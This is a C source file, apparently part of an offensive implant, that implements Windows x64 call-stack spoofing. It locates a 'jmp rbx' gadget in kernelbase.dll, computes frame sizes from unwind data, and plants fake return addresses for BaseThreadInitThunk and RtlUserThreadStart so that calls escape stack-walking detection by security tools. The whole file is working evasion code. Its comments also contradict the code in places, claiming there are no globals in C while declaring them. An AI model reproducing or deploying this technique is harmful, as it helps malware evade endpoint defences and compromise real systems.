/*
 * spoof_additions.c — add to services.c
 *
 * init_spoof():
 *   1. Get kernelbase.dll base via GetModuleHandleA
 *   2. Scan .text for FF E3 (jmp rbx) within a valid .pdata function
 *   3. Parse UNWIND_INFO to get F_gadget (alloc size of containing function)
 *   4. Compute all offsets and store in spoof_call.asm globals
 *
 * Crystal Palace PIC-safe: no CRT, no globals in C (globals are in spoof_call.asm .data)
 */

#include <windows.h>
#include "tcg.h"
#include "dfr.h"
#include "spoof.h"

/* Externals declared in spoof_call.asm .data section */
u64 g_spoof_btit;
u64 g_spoof_ruts;
u64 g_spoof_gadget;
u64 g_btit_offset;
u64 g_ruts_offset;
u64 g_null_offset;
u64 g_alloc_size;
u64 g_real_ret;

__attribute__((naked))
u64 spoof_call(u64 func, u64 a1, u64 a2, u64 a3, u64 a4, u64 a5)
{
    __asm__ volatile(
        // "pop    rbx\n\t"
        // "mov    r10, rcx\n\t"
        "pop    rax\n\t"                        /* real return addr            */
        "mov    [rip + g_real_ret], rax\n\t"   /* store it                    */
        "lea    rbx, [rip + g_real_ret]\n\t"   /* rbx = ptr to stored addr    */
        "mov    r10, rcx\n\t"                  /* save func ptr               */
        "mov    rcx, rdx\n\t"
        "mov    rdx, r8\n\t"
        "mov    r8,  r9\n\t"
        "mov    r9,  [rsp+0x20]\n\t"
        "mov    rax, [rsp+0x28]\n\t"
        "mov    r11, [rip + g_alloc_size]\n\t"
        "sub    rsp, r11\n\t"
        "mov    r11, [rip + g_spoof_gadget]\n\t"
        "mov    [rsp], r11\n\t"
        "mov    [rsp+0x28], rax\n\t"
        "mov    r11, [rip + g_spoof_btit]\n\t"
        "mov    rax, [rip + g_btit_offset]\n\t"
        "mov    [rsp+rax], r11\n\t"
        "mov    r11, [rip + g_spoof_ruts]\n\t"
        "mov    rax, [rip + g_ruts_offset]\n\t"
        "mov    [rsp+rax], r11\n\t"
        "xor    r11, r11\n\t"
        "mov    rax, [rip + g_null_offset]\n\t"
        "add    rax, rsp\n\t"
        "mov    [rax], r11\n\t"
        "jmp    r10\n\t");
}

/*
 * parse_unwind_alloc: parse UNWIND_INFO for the function containing func_addr
 * in the given PE image. Returns the total bytes allocated (sub rsp, N + push count*8).
 * Returns 0 on failure or if function uses a frame pointer (skip those).
 */
static u32 parse_unwind_alloc(u8 *base, u64 func_addr)
{
    u32 e_lfanew = *(u32 *)(base + 0x3C);
    u8 *nt = base + e_lfanew;
    u8 *opt = nt + 0x18; /* IMAGE_OPTIONAL_HEADER64 */

    /* DataDirectory[3] = Exception Directory (.pdata) — at opt+0x78 */
    u32 pdata_rva = *(u32 *)(opt + 0x78);
    u32 pdata_size = *(u32 *)(opt + 0x7C);

    if (!pdata_rva || !pdata_size)
        return 0;

    /* RUNTIME_FUNCTION: { BeginAddress, EndAddress, UnwindInfoAddress } — 12 bytes each */
    u32 *pdata = (u32 *)(base + pdata_rva);
    u32 count = pdata_size / 12;
    u32 rva = (u32)(func_addr - (u64)base);

    /* Binary search for the RUNTIME_FUNCTION entry containing rva */
    u32 lo = 0, hi = count;
    while (lo < hi)
    {
        u32 mid = (lo + hi) / 2;
        u32 begin = pdata[mid * 3 + 0];
        u32 end = pdata[mid * 3 + 1];

        if (begin <= rva && rva < end)
        {
            u32 unwind_rva = pdata[mid * 3 + 2];
            u8 *ui = base + unwind_rva;

            /* UNWIND_INFO layout:
             *  byte 0: Version(3)|Flags(5)
             *  byte 1: SizeOfProlog
             *  byte 2: CountOfCodes
             *  byte 3: FrameRegister(4)|FrameOffset(4)
             *  bytes 4+: UNWIND_CODE array (2 bytes each)            */
            u8 code_count = ui[2];
            u8 frame_reg = ui[3] & 0x0F;

            /* Skip frame-pointer functions — complex unwind */
            if (frame_reg != 0)
                return 0;

            u16 *codes = (u16 *)(ui + 4);
            u32 alloc = 0;
            int i;

            for (i = 0; i < (int)code_count; i++)
            {
                /* UNWIND_CODE: low byte = prolog offset,
                 *              high byte = OpInfo(4) | UnwindOp(4)      */
                u8 op = (codes[i] >> 8) & 0x0F;
                u8 info = (codes[i] >> 12) & 0x0F;

                if (op == 0)
                {
                    /* UWOP_PUSH_NONVOL: push reg (8 bytes) */
                    alloc += 8;
                }
                else if (op == 2)
                {
                    /* UWOP_ALLOC_SMALL: sub rsp, (info+1)*8 */
                    alloc += (u32)(info + 1) * 8;
                }
                else if (op == 1)
                {
                    /* UWOP_ALLOC_LARGE: next slot(s) hold size */
                    if (info == 0)
                    {
                        i++;
                        alloc += (u32)codes[i] * 8;
                    }
                    else
                    {
                        i++;
                        alloc += *(u32 *)(&codes[i]);
                        i++;
                    }
                }
                /* UWOP_SET_FPREG (3), UWOP_SAVE_NONVOL (4) etc. —
                 * don't affect rsp total alloc, skip them          */
            }
            return alloc;
        }

        if (begin > rva)
            hi = mid;
        else
            lo = mid + 1;
    }
    return 0;
}

void init_spoof(void)
{
    /* Get kernelbase.dll base address */
    u8 *base = (u8 *)KERNEL32$GetModuleHandleA("kernelbase.dll");
    dprintf("[+] init_spoof: base=0x%llx\n", (u64)base);
    if (!base)
    {
        dprintf("[-] init_spoof: GetModuleHandleA(kernelbase) failed\n");
        return;
    }

    /* Parse PE to locate .text section(s) */
    u32 e_lfanew = *(u32 *)(base + 0x3C);
    u8 *nt = base + e_lfanew;
    u16 n_sections = *(u16 *)(nt + 0x06);
    dprintf("[+] init_spoof: n_sections=%d\n", (int)n_sections);
    u16 opt_size = *(u16 *)(nt + 0x14);
    u8 *sections = nt + 0x18 + opt_size;

    u64 gadget = 0;
    u32 f_gadget = 0;
    int s;

    /* Scan all executable sections for FF E3 (jmp rbx) */
    for (s = 0; s < (int)n_sections && !gadget; s++)
    {
        u8 *sec = sections + s * 40;
        u32 chars = *(u32 *)(sec + 36);

        /* IMAGE_SCN_CNT_CODE (0x20) | IMAGE_SCN_MEM_EXECUTE (0x20000000) */
        if (!((chars & 0x20) && (chars & 0x20000000)))
            continue;

        u32 vaddr = *(u32 *)(sec + 12);
        u32 vsize = *(u32 *)(sec + 8);
        u8 *ptr = base + vaddr;
        u32 j;

        for (j = 0; j + 1 < vsize; j++)
        {
            if (ptr[j] != 0xFF)
                continue;
            if (ptr[j + 1] != 0xE3 && ptr[j + 1] != 0x23)
                continue;

            u64 cand = (u64)(ptr + j);
            u32 alloc = parse_unwind_alloc(base, cand);
            if (alloc > 0x200)
                alloc = 0x28; /* sanity cap */

            dprintf("[+] init_spoof: gadget 0x%llx bytes %02x %02x alloc=0x%x\n",
                    cand, ptr[j], ptr[j + 1], alloc);

            gadget = cand;
            f_gadget = alloc;
            break;
        }
    }

    if (!gadget)
    {
        dprintf("[-] init_spoof: no jmp rbx gadget found in kernelbase\n");
        return;
    }

    /* Compute fake-frame offsets
     *
     * Stack walker trace at func_rsp = A:
     *   NtXxx (alloc=0)      : ret addr at [A]              = gadget
     *   gadget func (f_gadget): ret addr at [A + 8+f_gadget] = BTIT+0x14
     *   BTIT (alloc=0x20)    : ret addr at [A + btit+8+0x20] = RUTS+0x21
     *   RUTS (alloc=0x38)    : ret addr at [A + ruts+8+0x38] = NULL        */
    u64 btit_off = 8 + (u64)f_gadget;
    u64 ruts_off = btit_off + 8 + 0x20;
    u64 null_off = ruts_off + 8 + 0x38;
    u64 alloc_sz = null_off + 8;

    g_spoof_gadget = gadget;
    g_spoof_btit = (u64)KERNEL32$BaseThreadInitThunk + 0x14;
    g_spoof_ruts = (u64)NTDLL$RtlUserThreadStart + 0x21;
    g_btit_offset = btit_off;
    g_ruts_offset = ruts_off;
    g_null_offset = null_off;
    g_alloc_size = alloc_sz;

    dprintf("[+] init_spoof: gadget=0x%llx f_gadget=0x%x btit@+0x%llx ruts@+0x%llx null@+0x%llx\n",
            gadget, f_gadget, btit_off, ruts_off, null_off);
}